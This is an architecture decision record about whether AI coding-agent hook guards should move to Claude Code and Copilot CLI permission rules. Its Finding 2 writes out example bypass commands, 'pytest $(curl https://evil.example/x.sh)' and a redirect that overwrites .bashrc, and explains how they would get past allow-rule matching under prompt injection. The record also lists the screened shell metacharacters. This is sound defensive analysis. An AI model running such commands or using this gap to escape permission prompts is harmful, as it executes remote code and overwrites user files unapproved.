---
id: ADR-085
status: accepted
date: 2026-07-20
decision-makers: [rjmurillo]
supersedes: []
superseded-by: null
explainer: null
implemented: false
---

# ADR-085: Cross-Harness Permission-Surface Asymmetry and Hook Survivor Disposition

## Status

Accepted (2026-07-20). Requested by issue #3217 as part of the issue #3197
vendored-hook ROI review. adr-review reached consensus (5 ACCEPT plus 1
Disagree-and-Commit, 0 P0, all P1 threads addressed); the initial debate log is
at `.agents/analysis/ADR-085-permission-surface-debate.md`. The PR #3259
amendment review is at `.agents/critique/ADR-085-debate-log.md`. The owner
ratified on 2026-07-20 and ruled the two open decisions: D-A internal-only and D-B
keep-as-hook (see the Owner Decision Record section). D-A resolves to the
internal-only branch, which differs from the adr-review recommendation
(customer-facing); the owner exercised final authority under User Sovereignty,
and both branches were already ruled ADR-084 rule-4 compliant in Decision 2. This
ADR records a decision only. It deletes no hook and migrates no permission; the
implementation lands under #3217 and #3218.

D-B keeps `test_auto_approval` as a hook, matching the recommendation. It reverses
a prior working approval to migrate it; new verified evidence (Finding 2) is the
reason.

## Amendment Record

PR #3259 replaced the repository's custom Git-hook framework with Lefthook. This
amendment updates the five active D-A implementation instructions to the current
framework and records that Lefthook and CI cannot preserve PreToolUse timing. It
does not change the owner's D-A internal-only or D-B keep-as-hook decisions.

## Date

2026-07-20

## Context

Issue #3197 authorized shrinking the vendored hook surface the project ships to
consumers. ADR-062 (amended, #3214) retired the LSP-first enforcement family.
ADR-084 (#3215) set the ROI bar that stops the surface re-accreting. Issue #3216
purged non-customer hooks. A small set of survivor guards remain.

Issue #3217 proposed the next step: move the survivors off hooks and onto
host-native permissions (`permissions.deny`, `permissions.allow`). Its stated
premise was that host-native permissions are "portable across Claude and Copilot
with no dual-surface machinery." Verification this session falsified that premise
on two independent axes.

Three survivor hooks were named in #3217:

- `invoke_skill_first_guard.py` (PreToolUse). Blocks a raw `gh` call when a
  validated skill script exists for that operation. Ships to Copilot
  (`src/copilot-cli/hooks/PreToolUse/invoke_skill_first_guard__*.py`). Policy and
  developer-experience control, not a security boundary. It fails open on parse
  and infrastructure errors and only blocks when a matching skill exists.
- `invoke_test_auto_approval.py` (PermissionRequest). Auto-approves a fixed set
  of test-runner commands to cut permission fatigue. Claude-only: there is no
  `src/copilot-cli/hooks/PermissionRequest/` directory.
- `invoke_observation_sync.py` (PostToolUse). Syncs this repo's internal Serena
  and Forgetful memories. Ships to Copilot
  (`src/copilot-cli/hooks/PostToolUse/invoke_observation_sync__*.py`) but has no
  consumer value.

### Finding 1: Copilot has no repo-committed permission surface, and the guard self-neuters today

Copilot CLI 1.0.72-1 exposes no repo-committed, fine-grained permission surface
comparable to Claude's `.claude/settings.json` `permissions` block. The surface
table below reflects the 1.0.72-1 probe of 2026-07-20; Copilot's permission model
may evolve, which is one of the re-evaluation triggers in Consequences. The
gap is tracked upstream as a feature request for a repo-committed, per-repo
permissions config (`github/copilot-cli#3176`, which proposes a committed
`.github/copilot-permissions.json` with `denyTools`, under the permissions
epic `github/copilot-cli#316`; related `github/copilot-cli#2398` requests a
default permissions config file). If Copilot ships a committed permission
surface, the asymmetry closes and this finding should be revisited.

| Harness | Surface | Repo-committed | Fine-grained | Ships with plugin |
|---------|---------|----------------|--------------|-------------------|
| Claude Code | `.claude/settings.json` `permissions.allow`/`deny`, e.g. `Bash(gh pr create:*)` | Yes | Yes, by command pattern | Yes |
| Copilot CLI | Session flags `--allow-tool 'shell(git:*)'` / `--deny-tool` | No | Per-invocation only | No |
| Copilot CLI | `~/.copilot/permissions-config.json` | No, user-global | No, coarse kinds (`write`) keyed by absolute path | No |
| Copilot CLI | `copilot config` | No command rules | No | No |

Migrating `skill_first_guard` to a Claude `permissions.deny` entry would express
the guard for Claude and silently drop it for every Copilot consumer, because no
committed Copilot surface can carry the rule.

There is a second, decisive fact about the guard's current behavior. Its `main()`
calls `skip_if_consumer_repo("skill-first-guard")` and returns immediately when
true (`.claude/hooks/PreToolUse/invoke_skill_first_guard.py:373-374`). That helper
(`.claude/lib/hook_utilities/guards.py`) returns true whenever the git origin is
not `ai-agents` (or is unknown and uncorroborated by `pyproject` name). So the
guard enforces only inside the `ai-agents` repo itself. In any consumer repo,
Claude or Copilot, it loads, checks the guard, and no-ops.

The consequence: the guard ships to Copilot but does not currently protect any
consumer. That makes its disposition an owner-intent question, not a mechanical
one (see D-A). The `github` skill scripts it points at do ship to consumers
(`src/copilot-cli/skills/github/scripts/`), which is evidence the guard was meant
to be customer-facing, but the `skip_if_consumer_repo` gate (added #1194,
2026-02-20) contradicts that intent.

### Finding 2: Claude allow-rules do not screen the metacharacters the test hook rejects

`invoke_test_auto_approval.py` is not a pure static allowlist. Before matching a
runner pattern it rejects any command containing a shell metacharacter: `;`, `|`,
`&`, `<`, `>`, `$`, backtick, newline, or carriage return
(`DANGEROUS_METACHARACTERS`, lines 22-32). It anchors each pattern to the start of
the command and closed a prior bypass where `python evil.py pytest` auto-approved
because `pytest` appeared anywhere in argv (lines 42-47). It is an injection guard
on an auto-approve path.

Claude Code `permissions.allow` matching (v2.1.x) is aware of shell separators. A
rule like `Bash(pytest *)` will not auto-approve `pytest && other-cmd`, because
Claude splits on the recognized separators (`&&`, `||`, `;`, `|`, `|&`, `&`, and
newlines) and requires each subcommand to match a rule. This fixes the
command-chaining bypass class tracked upstream in anthropics/claude-code#4956.

That separator set does not include command substitution (`$(...)`, backticks) or
redirects (`<`, `>`). Those are not separators, so they do not split the command.
A rule like `Bash(pytest *)` therefore matches, and auto-approves, both of these:

- `pytest $(curl https://evil.example/x.sh)` (command substitution, no inner
  separator), which executes the substitution.
- `pytest > /home/user/.bashrc` (output redirect), which overwrites the file.

The hook rejects both (`$` and `>` are screened). Migrating `test_auto_approval`
to `permissions.allow` would widen what auto-approves without a prompt to include
command-substitution and redirect forms the hook blocks today. On an auto-approve
path, under an autopilot or prompt-injection threat model, that is a security
regression, not a neutral refactor. Risk score 7/10: command execution or file
overwrite with no confirmation prompt, reachable by prompt-injected agent input
(CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).

No `permissions.deny` companion cleanly closes the gap. The decisive reason is
scope: a deny rule applies to every command, not only the allow path that carries
the risk, so a global `Bash(*$*)`-style deny would also block legitimate
interactive `pytest` invocations that contain `$`, even ones the user approves by
hand. A secondary reason is expressiveness: deny rules are prefix and glob, and
`$` escaping in Claude's glob engine is undocumented, so a rule scoped to "pytest
containing `$`" cannot be written with confidence. The hook's screen is also not
total: it rejects `$` and backtick but not tilde (`~`) or brace (`{a,b}`)
expansion, a lower-severity path gap (risk 3/10) that migration would not change
either way.

## Decision

### 1. General eligibility test for hook-to-permissions migration

A vendored guard hook may be replaced by host-native permissions only when BOTH
hold:

1. **Portability.** An equivalent repo-committed, shippable permission surface
   exists on every harness the hook targets. A hook that ships to Copilot fails
   this until Copilot gains a committed permission surface. Session flags,
   user-global config, and wrapper arguments do not qualify.
2. **Fidelity.** The hook carries no parsing or injection semantics the
   permission surface cannot replicate. A hook that screens command substitution,
   backticks, or redirects on an auto-approve or auto-deny path fails this on
   Claude today, because `permissions.allow` splits on separators only.

### 2. `skill_first_guard`: remove it from the vendored surface; preserve only enforceable policy (D-A)

Do not migrate `skill_first_guard` to a Claude `permissions.deny` rule. It fails
portability (ships to Copilot, no committed Copilot surface). A permissions rule
also cannot express the guard's conditional logic ("deny raw `gh X` only when a
skill exists") or its instructional block message.

Before the owner classified its scope, keeping the hook mechanism was the only
behavior-preserving alternative to permissions. That did not sanction the
shipped-dead state. Self-neutering via `skip_if_consumer_repo` on a hook shipped
to Copilot is a direct ADR-084 rule 4 violation. This ADR grants no exception.

**Resolution (owner, 2026-07-20): internal-only.** `skill_first_guard` is
dogfood-only developer experience, not customer-facing. Per ADR-084 rule 4,
remove it from the vendored Copilot surface and stop shipping it. This differs
from the adr-review recommendation (customer-facing), and the owner ruled under
User Sovereignty. Implementation lands under #3217; #3218 rescopes to retire the
dispatch, parity, and drift machinery whose last consumer this removal eliminates.

This scope decision does not claim a behavior-preserving relocation. Lefthook and
CI receive Git or workflow events, not the PreToolUse payload, and cannot block a
raw `gh` command before it executes. Under #3217, the implementation MUST:

1. Remove the guard from the vendored surface and its generated registrations.
2. Name any repository-state invariant that remains enforceable through
   `lefthook.yml` or CI, including its trigger, failure behavior, and acceptance
   test.
3. Record the retirement of pre-execution blocking unless a separate decision
   approves a non-vendored agent-time carrier.

No implementation may describe Lefthook or CI as an equivalent replacement for
the removed PreToolUse guard.

For this guard, Decision 2 narrows ADR-084 rule 4's "moves to Lefthook or CI"
language to policy with an observable Git or workflow invariant. When no such
invariant exists, explicit retirement satisfies rule 4's non-vendoring purpose.
Creating a post-execution gate that cannot observe or prevent the original action
does not.

### 3. `test_auto_approval`: recommend keeping the hook (D-B)

Recommendation: keep `test_auto_approval` as a Claude hook. Do not migrate to
`permissions.allow`. Finding 2 shows the migration widens an auto-approve path to
command-substitution and redirect forms the hook screens. ADR-084 rule 3 is the
authorizing basis: prefer a host-native surface, but when that surface cannot
express the required logic (here, the metacharacter screen on the auto-approve
path), a spawning hook is the right tool. This recommendation reverses the earlier
working approval to migrate (recorded in the #3197 autopilot working session, the
prior turn), which assumed a clean one-for-one replacement; the fidelity gap was
not known then. Recorded as D-B for owner ratification.

A third option exists and is recorded in D-B: delete the auto-approval outright. It
is Claude-only, so deletion costs one extra permission prompt per test run for this
repo's own developers and removes the fidelity gap and the hook at once. It is the
most shrink-aligned option (#3197) and, having no auto-approve path at all, the
safest. It is not the recommendation only because the owner may value the reduced
prompt fatigue; the owner picks among keep, migrate, and delete in D-B.

An independent draft of this ADR (GPT-5.6-Sol) recommended migrating because the
hook is Claude-only; that draft did not model the fidelity gap. Being Claude-only
removes the portability objection, not the fidelity one.

**Resolution (owner, 2026-07-20): keep as a hook.** Matches the recommendation.
`test_auto_approval` stays a Claude hook; no migration, no deletion.

### 4. `observation_sync`: out of scope, route to #3216

It makes no permission decision, so it is not a permissions candidate. As a
PostToolUse hook it fires after tool execution; permissions gate only before
execution, so no permission rule can carry its behavior in any case. It syncs this
repo's internal Serena and Forgetful stores, not consumer state, so it carries no
consumer value in the shipped configuration. Its removal belongs to the #3216
non-customer hook purge, not this ADR.

### 5. Partial dispatcher retirement (#3218)

While any hook survives on the Copilot surface, #3218 cannot fully retire the
dispatcher, parity, and drift machinery. Rescope #3218 to retire only machinery
whose last hook consumer is gone. Full retirement requires either removal of every
surviving Copilot hook or replacements that pass the eligibility test in Decision
1.

### 6. Confirmation

The eligibility test (Decision 1) is applied at adr-review time for any future
hook-to-permissions migration proposal. ADR-084 rule 5's vendored-hook presence
check is the containing gate that surfaces such hooks for review. The #3218 rescope
(Decision 5) is confirmed done when both hold: every dispatcher, parity, and drift
component whose last surviving hook consumer is gone is removed; and each component
still referenced by a surviving hook is listed as retained with that hook. After
#3216 and #3217 land, neither `observation_sync` nor `skill_first_guard` qualifies
as a retained consumer. The inventory MUST include the shipped security controls
required by ADR-083 and any remaining keepers, including `compact_checkpoint` and
`markdownlint_guard`.

## Owner Decision Record

### D-A: Is `skill_first_guard` customer-facing or internal?

- **Review recommendation before owner ruling: customer-facing.** The `github`
  skill scripts it enforces ship
  to consumers; a guard that steers agents to those scripts has consumer value.
  If customer-facing: keep the hook on both harnesses, remove
  `skip_if_consumer_repo` from this guard, and make skill discovery plugin-root
  aware (`COPILOT_PLUGIN_ROOT`/`CLAUDE_PLUGIN_ROOT`) so it resolves shipped scripts
  in a consumer repo. Implement under #3217.
- **Alternative selected by owner: internal-only.** If the owner intends it as
  dogfood-only DX, then
  per ADR-084 rule 4 (customer-facing hooks must not self-neuter; internal
  enforcement belongs in Lefthook or CI) remove it from the vendored Copilot
  surface and stop shipping it.

Either way the `skip_if_consumer_repo` no-op-in-place state is not a valid
end state for a shipped hook.

**Resolved (owner, 2026-07-20): internal-only.** Stop shipping
`skill_first_guard` on the vendored surface. Any remaining repository-state policy
belongs in `lefthook.yml` or CI. This choice does not preserve PreToolUse
interception; #3217 must satisfy Decision 2's confirmation requirements.

### D-B: Keep, migrate, or delete `test_auto_approval`?

- **Recommendation: keep as a hook.** Evidence: Finding 2. Keeping it preserves
  the metacharacter screening on the auto-approve path at the cost of one Claude
  PermissionRequest hook.
- **Alternative: migrate to `permissions.allow`.** Removes one hook and its
  dispatch group. Accepts that `pytest $(...)`, backtick, and redirect forms
  auto-approve without a prompt. Only choose this if the owner judges that residual
  auto-approve surface acceptable.
- **Alternative: delete the auto-approval outright.** Removes the hook and the
  auto-approve path entirely. No fidelity gap, no dispatch group, smallest surface,
  most aligned with the #3197 shrink mandate. Cost: one extra permission prompt per
  test run for this repo's own developers (the hook is Claude-only and does not ship
  to consumers). Choose this if reduced surface outweighs prompt fatigue.

**Resolved (owner, 2026-07-20): keep as a hook.** `test_auto_approval` stays a
Claude hook; no migration, no deletion.

## Prior Art Investigation

### What Currently Exists

- The Python `skill_first_guard` entered via #1165 (2026-02-14), migrated from an
  earlier PowerShell form (#1065). The `skip_if_consumer_repo` gate was added in
  #1194 (2026-02-20). Verified via `git log` this session.
- `test_auto_approval` is registered as a Claude PermissionRequest hook in
  `.claude/settings.json` and as group `plugin-permissionrequest-test_auto_approval`
  in `.claude/hooks/dispatch_groups.json`. `.claude/settings.json` has no
  `permissions` block today; hooks are the only committed enforcement surface.
- Copilot hook generation (ADR-068) and Claude group dispatch (ADR-082) build the
  `src/copilot-cli/hooks/` tree from the canonical `.claude/hooks/` source.

### Historical Rationale

The skill-first guard prevents agents bypassing tested GitHub workflows with raw
`gh`. `test_auto_approval` used a hook because the repo did not use Claude
permission declarations; the host feature now expresses allowlists natively, which
is what prompted the #3217 migration proposal.

### Why Change Now

Epic #3197 set a cost bar for vendored hooks. #3217 assumed permissions were a
drop-in replacement. Verification shows they are not, for these survivors: Copilot
has no committed surface (Finding 1) and Claude allow-rules under-screen an
auto-approve path (Finding 2). Recording this stops the next ROI pass from
re-proposing the same migration and rediscovering both findings.

## Rationale

### Alternatives Considered

| Alternative | Pros | Cons | Why Not Chosen |
|-------------|------|------|----------------|
| Migrate both guards to permissions (the #3217 plan) | Retires two hooks; enables more of #3218 | Strips `skill_first_guard` from Copilot; widens `test_auto_approval` auto-approve to `$(...)`/redirects | Fails both criteria; ships a security regression |
| Migrate `test_auto_approval` only (Claude-only, Sol draft) | Removes one hook + dispatch group | Auto-approve fidelity gap remains on Claude | Narrow but real auto-approve regression; not worth one fewer hook |
| Delete `test_auto_approval` outright (no auto-approve) | Removes the hook, its dispatch group, and the fidelity gap; most shrink-aligned; safest | One extra permission prompt per test run for this repo's developers | Viable; offered as the third D-B branch, not pre-decided by this ADR |
| Dual-surface: hook on Copilot, permissions on Claude | Uses native surface where it exists | Reintroduces the per-harness divergence #3218 wants gone | Adds machinery to remove machinery |
| Keep both as hooks; record the eligibility test (review recommendation before D-A ruling) | No regression; portable; prevents re-litigation | #3218 only partially retires; per-call spawn stays | Owner classified `skill_first_guard` as internal-only |
| Remove `skill_first_guard` from the vendored surface; keep `test_auto_approval` (chosen) | Complies with D-A and preserves D-B's metacharacter screen | Retires the pre-execution skill-first block unless a separate carrier is approved | Final owner-ratified combination |

### Trade-offs

Until #3217 lands, both guards cost process spawns and keep dispatcher machinery
alive. D-A removes `skill_first_guard` from the vendored surface but cannot preserve
its pre-execution timing through Lefthook or CI. D-B keeps the bounded
`test_auto_approval` cost because migrating it widens the auto-approve surface.

## Consequences

### Positive

- No Copilot consumer receives a self-neutering dead `skill_first_guard`: D-A
  internal-only removes it from the vendored surface. Any remaining
  repository-state policy stays in this repo's `lefthook.yml` or CI (ADR-084
  rule 4).
- No auto-approve path widens to command substitution or redirects (D-B kept).
- One written eligibility test stops the next ROI pass re-proposing this migration.

### Negative

- #3218's dispatcher retirement is only partial while any Copilot hook survives.
  #3218 must be rescoped to "last consumer gone."
- The retained-consumer inventory must include the customer-facing security
  controls required by ADR-083 and every other surviving hook.
- Lefthook and CI do not preserve `skill_first_guard`'s pre-execution block.
- The per-call spawn cost for `test_auto_approval` remains on Claude.
- Copilot consumers get no skill-first steering at all under D-A internal-only; the
  vendored guard is removed. If a consumer need surfaces later, reopening it as a
  customer-facing hook is a fresh proposal against the eligibility test.

### Neutral

- `observation_sync` stays governed by #3216.
- The eligibility test is falsifiable and time-bound. A committed Copilot
  permission surface reopens `skill_first_guard`'s portability; Claude allow-rules
  that screen substitution and redirects reopen `test_auto_approval`'s fidelity.
  Re-evaluation trigger: reassess when anthropics/claude-code#4956 closes, when a
  Claude Code minor changes the separator or substitution handling, or at Copilot
  CLI 2.0, whichever comes first. Absent any of those by 2027-01-20 (six months),
  re-run this ROI pass rather than treat the keep as permanent.

## Impact on Dependent Components

| Component | Dependency Type | Required Update | Risk |
|-----------|-----------------|-----------------|------|
| Issue #3217 | Direct | Remove the D-A guard from the vendored surface, record the lost PreToolUse timing, define any remaining repository-state check, and keep D-B | High |
| Issue #3218 | Direct | Rescope to "retire only machinery whose last hook consumer is gone" | Medium |
| `.claude/hooks/PreToolUse/invoke_skill_first_guard.py` | Direct | D-A internal-only: remove it from the vendored surface; do not claim equivalent Git-event or CI enforcement | High |
| `.claude/settings.json`, `.claude/hooks/dispatch_groups.json` | Direct | Drop the `skill_first_guard` registration; `test_auto_approval` registration stays (D-B kept) | Medium |
| `src/copilot-cli/hooks/PreToolUse/invoke_skill_first_guard__*.py` | Generated | Removed from the vendored surface under #3217 (stops shipping) | Medium |
| Issue #3216 | Governance | Retain ownership of `observation_sync` removal | Low |

## Implementation Notes

This ADR changes no code; the owner ratified D-A and D-B on 2026-07-20. Follow-ups
it authorizes: under #3217, remove `skill_first_guard` from the vendored surface,
record the loss of PreToolUse blocking, and define any repository-state policy
that remains enforceable through `lefthook.yml` or CI. `test_auto_approval` is
unchanged (D-B kept). Rescope #3218 to retire only the dispatch, parity, and drift
machinery whose last hook consumer the removal eliminates.

## Related Decisions

- ADR-062 (amended, #3214): retired LSP enforcement, kept static steering.
  Precedent for dropping an expensive carrier. This ADR reaches the opposite
  disposition because the cheaper carrier (permissions) cannot faithfully carry
  these two guards.
- ADR-084 (#3215): the vendored-hook ROI bar and the no-self-neuter rule that D-A
  applies.
- ADR-083 (#3222): the dogfood mandate that makes Finding 2 blocking.
- ADR-068, ADR-082: the dispatcher machinery whose retirement (#3218) is now
  bounded by the surviving hooks.

## References

- Issues #3197, #3217, #3218, #3216, #3219.
- Claude Code permissions, "Compound commands": <https://code.claude.com/docs/en/permissions>.
- anthropics/claude-code#4956: Bash permission bypass via command chaining.
- `.claude/hooks/PreToolUse/invoke_skill_first_guard.py:373-374` (self-neuter);
  `.claude/lib/hook_utilities/guards.py` (`skip_if_consumer_repo`).
- `.claude/hooks/PermissionRequest/invoke_test_auto_approval.py:22-32` (screened
  metacharacters), `:42-47` (prior anchored-pattern bypass fix).
- Copilot CLI 1.0.72-1 permission-surface probe, 2026-07-20.
